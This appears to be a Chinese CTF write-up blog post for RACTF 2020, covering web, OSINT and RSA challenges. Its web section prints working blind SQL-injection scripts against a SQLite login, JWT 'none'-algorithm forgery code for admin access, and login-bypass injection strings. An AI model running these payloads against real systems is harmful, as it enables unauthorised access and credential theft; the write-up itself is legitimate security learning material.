class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:        <span class="comment"># 防止连接过多报错，导致中断脚本</span></span><br><span class="line">            <span class="keyword">if</span> request(i, <span class="string">&quot;&gt;&quot;</span> , mid):   </span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> request(i, <span class="string">&quot;&lt;&quot;</span> , mid): </span><br><span class="line">                right = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> request(i, <span class="string">&quot;=&quot;</span> , mid):</span><br><span class="line">                res += <span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(res)   </span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Connection Error&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>选择任意一个对应的用户名和密码登录，得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608221814.png"></p>
+<h3 id="Getting-admin"><a href="#Getting-admin" class="headerlink" title="Getting admin"></a>Getting admin</h3><p>提示：See if you can get an admin account.</p>
+<p>环境同上一题。让我得到管理员账户，但弄了半天，也不知道怎么搞。花了50点，看了hint如下。</p>
+<p>Hint: Look into JWTs, specifically the <code>none</code> algorithm.</p>
+<p>看来是jwt的问题，在这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6776#toc-2">博客</a>学习了一波jwt。再看提示，关键为空算法。看来是把算法改成空，就可以通过验证，是比较简单的一种攻击。</p>
+<p>在Cookie中就可以看到格式类似于jwt的东西，两个小数点把数据分为三段非常明显。早该注意的，可惜之前碰到jwt的时候没好好学习。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609200820.png"></p>
+<p>把这部分jwt拿到<a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a>上解密得到关键信息。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200609201028.png" style="zoom:50%;" />
+
+<p>知道了payload，就可以构造信息生成payload。之前，我们盲注知道表单有privilege表段，并且所有账户的值都为1。猜测这个值是用来标识管理员的，在猜测各种数字之后，最终确定是2标识了管理员。</p>
+<p>之后，用如下脚本生成让服务器不进行验证的jwt。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt	<span class="comment">#pip装</span></span><br><span class="line"><span class="comment"># 任选一用户，修改标识</span></span><br><span class="line">encode_jwt = jwt.encode(&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;privilege&quot;</span>:<span class="number">2</span>&#125;, <span class="literal">None</span>, algorithm=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encode_jwt)</span><br><span class="line"><span class="comment"># b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiSGFycnkiLCJwcml2aWxlZ2UiOjJ9.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>把cookie中的auth更改为生成的值，再去点击页面左下角的admin，得到flag。就这最后一步，我还弄了半天，因为一直在bp上弄的，最后才发觉是要点这个admin，orz。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200609201546.png" style="zoom:50%;" />
+
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609201717.png"></p>
+<h3 id="Finding-server-information-未做出"><a href="#Finding-server-information-未做出" class="headerlink" title="Finding server information(未做出)"></a>Finding server information(未做出)</h3><p>提示：See if you can find the source, we think it’s called app.py</p>
+<p>环境同上一题。仍然是看了半天没思路，去看了Hint。</p>
+<p>Hint:That URL looks like it might be vulnerable to LFI… if only we could get around Nginx filtering ../</p>
+<p>本地文件包含，过滤了路径穿越的关键符号，进行绕过就可以了。至于为什么是路径穿越，在我看到这个videos文件夹的时候，就应该想到的，还是没有题感。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200609202705.png" alt="50" style="zoom:50%;" />
+
+<p>看到wp，有如下解释：</p>
+<blockquote>
+<p>Our goal is to find the app.py file somewhere within this application. So trying out some random values for /watch/[input] gives a server error. When we try /watch/app.py, we see that it does not give an error and that there is no video showing.</p>
+</blockquote>
+<p>所以尝试访问错误URL，获取服务器报错信息。但是在/watch/app.py这里，并没有报错。看下源码，就得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610200538.png"></p>
+<p>hint坑人啊，我还一直在向../被过滤这方面考虑，简直了。</p>
+<h2 id="环境3"><a href="#环境3" class="headerlink" title="环境3"></a>环境3</h2><h3 id="Entrypoint"><a href="#Entrypoint" class="headerlink" title="Entrypoint"></a>Entrypoint</h3><p>提示：Sadly it looks like there wasn’t much to see in the python source. We suspect we may be able to login to the site using backup credentials, but we’re not sure where they might be. Encase the password you find in <code>ractf&#123;...&#125;</code> to get the flag.</p>
+<p><strong>This challenge does NOT have fake flags.</strong> If you found some other flags while solving this challenge, you may have found the solutions to the next challenges first :P</p>
+<p>这好像是一系列的题目都在一个环境上面，会找到多个flag，才有上面这个提示。</p>
+<p>进入环境，看到一个python的登录界面，这个还是挺新奇的，不是php的。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200608081639.png" alt="50" style="zoom:50%;" />
+
+<p>然后，查看页面源代码，看到一个提示backup.txt。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608081751.png"></p>
+<p>但是，直接访问它，发现禁止访问。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082024.png"></p>
+<p>然后，就想去扫下目录。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082155.png"></p>
+<p>去访问console，发现让我们输入PIN码，想到了flask的debug模式下的PIN码问题，可以根据信息去构造出PIN码。但这里应该还用不到。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082404.png"></p>
+<p>访问robots.txt，看到几个disallow。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082506.png"></p>
+<p>访问admin，wp-admin和admin.php，都显示没有资源。访问static，获取一些报错信息。根据报错信息能获取一些生成PIN码所需要的路径信息。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200608083652.png" alt="50" style="zoom:50%;" />
+
+<p>访问sitemap.xml，看到sitemap.xml.bak。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082533.png"></p>
+<p>访问sitemap.xml.bak，下载得到文件。打开后，看到_journal.txt。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608082742.png"></p>
+<p>访问_journal.txt，得到日志信息，还有一个flag。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200608082905.png" alt="50" style="zoom:50%;" />
+
+<p>但提交flag之后，发现不是这一问的。</p>
+<img src="https://gitee.com/crownz/blog_image/raw/master/20200608083039.png" alt="50" style="zoom:50%;" />
+
+<p>最后，再看_journal.txt的第三段话，意识到这里的登录框存在注入点。输入admin’和123，就发现可以报错。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608162236.png"></p>
+<p>输入admin’or’1，登录成功。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608162152.png"></p>
+<p>根据这样的标志，在这篇<a target="_blank" rel="noopener" href="http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/#4-SQLite">博客</a>学习了sqlite的相关语法，写出如下脚本，进行盲注。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- encoding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">index, compare, chr_index</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://95.216.233.106:26143/&quot;</span></span><br><span class="line">    <span class="comment">#1.所有表名  users</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27;),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment">#2.所有表结构(包含字段名，表名,</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT sql FROM sqlite_master WHERE type=&#x27;table&#x27;),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment">#3字段内容, 一次只能查一个字段</span></span><br><span class="line">    <span class="comment">#payload = &quot;&#x27; or (substr((SELECT group_concat(username) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;.format(str(index), compare, ascii(chr(chr_index)))</span></span><br><span class="line">    <span class="comment">#payload = &quot;&#x27; or (substr((SELECT group_concat(password) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;.format(str(index), compare, ascii(chr(chr_index)))</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT password FROM users limit 2,1),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment"># 0,1,0,0,0,0,0,0</span></span><br><span class="line">    <span class="comment">#payload = &quot;&#x27; or (substr((SELECT group_concat(admin) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;.format(str(index), compare, ascii(chr(chr_index)))</span></span><br><span class="line">    <span class="comment"># not authorized</span></span><br><span class="line">    <span class="comment">#payload = &quot;&#x27; or (substr((select load_extension(&#x27;./backup.txt&#x27;)),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) or &#x27;0&quot;.format(str(index), compare, ascii(chr(chr_index)))</span></span><br><span class="line">    </span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url, data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxslayer420&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:        <span class="comment"># 防止连接过多报错，导致中断脚本</span></span><br><span class="line">            <span class="keyword">if</span> request(i, <span class="string">&quot;&gt;&quot;</span> , mid):   <span class="comment"># target &lt; mid </span></span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> request(i, <span class="string">&quot;&lt;&quot;</span> , mid): </span><br><span class="line">                right = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> request(i, <span class="string">&quot;=&quot;</span> , mid):</span><br><span class="line">                res += <span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(res) </span><br><span class="line">                <span class="comment">#print(res.lower()) </span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Connection Error&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>得到表的结构如下：</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608183226.png"></p>
+<p>得到用户名如下，这里都是小写是因为之前的脚本都把它变小写了，后来意识到这样做是不对的，因为有的账户名是大写。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608190307.png"></p>
+<p>其他相应的东西，都可以由上面脚本爆出来，但没什么用。因为他对密码进行了sha256的加密（从表结构的第三列得知），我爆出来去解密也得不到结果。还有一个信息，就是第二个账户为管理员。</p>
+<p>做了很多了的工作，最后还是再看了一遍题目的提示和_journal.txt中的一段话，才弄出来。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609085235.png"></p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609085353.png"></p>
+<p>读了以上的信息，发现这里的关键还是哪个backup.txt文件，但是直接访问会报错，提示没有权限。直到我一一尝试，在static后面加上backup.txt，访问成功。得到develop的账户和密码，把密码裹起来，就是flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609085623.png"></p>
+<p>这个方式挺奇怪的，也不清楚是为什么，去搜索一下，得到如下答案：</p>
+<blockquote>
+<p>默认设置下，Flask 在程序根目录中名为 static 的子目录中寻找静态文件。如果需要，可在static 文件夹存放文件。服务器收到前面的 URL 后，会生成一个响应，包含文件系统中 <code>static/XXX</code>文件的内容。</p>
+</blockquote>
+<p>看来这个备份文件是在static中的，一访问就从服务器的static中寻找。这样的利用方式像是后门一样。</p>
+<h3 id="Baiting"><a href="#Baiting" class="headerlink" title="Baiting"></a>Baiting</h3><p>提示：That user list had a user called <code>loginToGetFlag</code>. Well, what are you waiting for?</p>
+<p>让我们登录获取flag，那么怎么以特定用户登录呢。构造用户名：loginToGetFlag’and’1’–和密码：123（任意），相当于把后面的密码给注释了，前面的查询为真，登录就得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609093140.png"></p>
+<p>这里是用and连接，同时把后面的东西给注释掉，导致这个用户名的查询语句为真，就登录成功。之前一直是用的or，这里的and还是试了一会儿的，要多思考这种逻辑才对。</p>
+<h3 id="Admin-Attack-未做出"><a href="#Admin-Attack-未做出" class="headerlink" title="Admin Attack(未做出)"></a>Admin Attack(未做出)</h3><p>提示：Looks like we managed to get a list of users. That admin user looks particularly interesting, but we don’t have their password. Try and attack the login form and see if you can get anything.</p>
+<p>在前面的Entrypoint登录之后，发现所有用户，就是我之前注入得到的。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609085756.png"></p>
+<p>题目让我们攻击登录表单，看看有什么信息。经过侧睡，发现他会报出的错误有两种语句类型。一种是选择加密算法，另一种是选择用户和密码对应的记录。个人猜测是，先选算法，对密码加密，然后再将加密密码传入第二个选择用户记录的语句，判断是否能登录。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609092112.png"></p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200609092258.png"></p>
+<p>我想根据盲注信息来登录，但事实是不行的，密码都是sha256加密，爆出来的东西只能确定数据库结构。</p>
+<p>然后，看<a href="">国内同仁</a>的wp，简单构造<code>username=&#39;or 1 limit 1,1--&amp;password=123</code>，就能得出flag。limit 1,1等于说就是把第二条记录，也就是管理员那条记录给选出来了，这样就成功管理员登录。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610201921.png"></p>
+<h3 id="Vandalism-未做出"><a href="#Vandalism-未做出" class="headerlink" title="Vandalism(未做出)"></a>Vandalism(未做出)</h3><p>提示：That admin panel was awfully bare. There must be some other page, but we’ve no idea where it is. <em>Just to clarify, <code>ractf&#123;;)&#125;</code> is the greedy admins stealing all the flags, it’s not the actual flag.</em></p>
+<p>说一定还有其它页面，然后在前面的管理员登录响应页面看到了一个东西。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610203021.png"></p>
+<p>访问之后，在源代码看到一堆下面的东西。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610203328.png"></p>
+<p><a target="_blank" rel="noopener" href="http://ha1c9on.top/2020/06/06/ractf-2020web-check-in/#Finding-server-information">这里</a>说这个是Unicode编码和ascii的混合，用脚本遍历ascii，就可得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://95.216.233.106:30279/__adminPortal&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>:<span class="string">&#x27;5d924781-f5dd-42b3-bad0-093ff15782ee&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">s=string.printable</span><br><span class="line">session = requests.session()</span><br><span class="line">session.mount(<span class="string">&#x27;http://&#x27;</span>, HTTPAdapter(max_retries=<span class="number">5</span>))</span><br><span class="line">result=session.get(url=url,cookies=cookie).text</span><br><span class="line">data=result.split(<span class="string">&#x27;\&lt;\h3 style=&quot;display:none&quot;\&gt;&#x27;</span>)	<span class="comment">#要去掉反斜杠</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610204206.png"></p>
+<h3 id="Insert-witty-name-未做出"><a href="#Insert-witty-name-未做出" class="headerlink" title="Insert witty name(未做出)"></a>Insert witty name(未做出)</h3><p>提示：Having access to the site’s source would be really useful, but we don’t know how we could get it. All we know is that the site runs python.</p>
+<p>关键是python这个框架，但不熟。以如下的方式就可以得到flag，emmm，python这种见的还是少啊。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610202642.png"></p>
+<h3 id="Xtremely-Memorable-Listing"><a href="#Xtremely-Memorable-Listing" class="headerlink" title="Xtremely Memorable Listing"></a>Xtremely Memorable Listing</h3><p>提示：We’ve been asked to test a web application, and we suspect there’s a file they used to provide to search engines, but we can’t remember what it used to be called. Can you have a look and see what you can find?</p>
+<p>flag为最开始在_journal.txt找到的值。</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h2><p>签到题，在Discord中找到flag</p>
+<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><p>这好像是个社工类型的题目类别，考察信息搜集，定位目标人员。</p>
+<h2 id="RAirways"><a href="#RAirways" class="headerlink" title="RAirways"></a>RAirways</h2><p>题目：Agent. We found a target posting strange images of boarding passes to his Instagram. None of the guys at base can figure it out, but we think he’s been using the images to exfiltrate data. We’ve attached a high-quality version of the image below, here’s the one from his Instagram: </p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608100357.png"></p>
+<p>在上图看到了条形码，直接到<a target="_blank" rel="noopener" href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx">识别条码网站</a>，识别得到flag。</p>
+<blockquote>
+<p>ractf{B0ard1ngP4ssD4t4}</p>
+</blockquote>
+<h2 id="Remote-Retreat"><a href="#Remote-Retreat" class="headerlink" title="Remote Retreat"></a>Remote Retreat</h2><p>题目：Agent, it’s good to have you.</p>
+<p>One of our targets has been constantly avoiding us, but we managed to find their private Instagram. They just posted a photo, but we can’t work out where they are. We tried to check the EXIF data, but it appears the social platform removes it automatically.</p>
+<p>Let us know where he is by clicking on the map, you’ll have to be accurate to within 500 meters!</p>
+<p>给出一张目标的摄影照片（如下），然后让我们去寻找目标所在地。刚开始以为挺麻烦的，在试了一会儿发现还是可以做的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200608104552.png"></p>
+<p>用谷歌加上图片中的关键字搜图，发现一个网址。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608103305.png"></p>
+<p>点进去，在第13位发现了目标地点。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608103421.png"></p>
+<p>进入目标地点的介绍，看到是类似于大众点评的介绍。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200610211135.png"></p>
+<p>可以在左上角看到地址。点击进入谷歌地图，搜索上图中的地址，在url框看到两个东西，就猜测为地点相应经纬度，后面也证明猜想是没错的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200608104755.png"></p>
+<p>然后就可以拿着经纬度，去题目给的提交框提交。每次提交后，会在地图上定位到正中心的位置。每次提交后，还需要手动放大地图，直到找到相应地点提交flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608105520.png"></p>
+<h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Really-Simple-Algorithm"><a href="#Really-Simple-Algorithm" class="headerlink" title="Really Simple Algorithm"></a>Really Simple Algorithm</h2><p>题目：Challenge instance ready at <code>95.216.233.106:43859</code>.</p>
+<p>nc连接上之后，发现给出p，q，e和ct，就认为是RSA了。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607182039.png"></p>
+<p>p，q是两个私钥，e是公钥，ct是密文。直接用python写出脚本，解密即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x,y, u,v = <span class="number">0</span>,<span class="number">1</span>, <span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b%a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b,a, x,y, u,v = a,r, u,v, m,n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p=<span class="number">6993365611498418289502641340524674421618810802436688610741973750021700622798246666643885969098252872456954088986333134850544202679360445912541828798563903</span></span><br><span class="line">    q=<span class="number">6880339459604993627291530006650423175004242981902238126768445096491714628297578367622929482486017466042799044465060922104847767753211803296373973622478957</span></span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    ct=<span class="number">36553323666123409329155619944166455541459939040873892318801454187334745671791946750332229307780406214918996738766799528473970188273718491074234783333556074303190986720797899225926910140495266799687661066113156984532381641620498540793824063777475356973614158626705646554527705777303415419332356169816444961588</span></span><br><span class="line">    <span class="comment"># compute n</span></span><br><span class="line">    n = p * q</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute phi(n)</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute modular inverse of e</span></span><br><span class="line">    gcd, a, b = egcd(e, phi)</span><br><span class="line">    d = a</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">&quot;n:  &quot;</span> + <span class="built_in">str</span>(d) );</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decrypt ciphertext</span></span><br><span class="line">    pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">&quot;pt: &quot;</span> + <span class="built_in">str</span>(pt) )</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(pt))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><!--等结束在看其他人的wp，发现一些东西并不难，只是自己想复杂了，或者说根本不知道一些简单的东西。就想那个SQL注入，根本不需要盲注的，根据爆出的语句结构进行构造就行了，可能是最近练习盲注脚本上头了，2333，也得感谢周兄的看了几下题，帮我往这条路上引了。最后是弄了很久盲注，练习下也没什么不好。那个flask的PIN码问题也没考，但为什么要给那个页面，很误导人。还有一些简单的知识也得了解清楚啊，不然总走歪了。这个CTF不难，但是挺有意思的，循序渐进，而且不是PHP搭的页面。这次CTF应当是体验最好的一次了，想了很多东西，也学了一些东西，很不错。打CTF的确是要静下心来，仔细的去思考。-->
+
+<blockquote>
+<p>参考</p>
+<p>[1] <a target="_blank" rel="noopener" href="https://elnath.io/category/web/">Elnath-Web</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="http://ha1c9on.top/2020/06/06/ractf-2020web-check-in/#Finding-server-information">[RACTF 2020]Write-Up</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
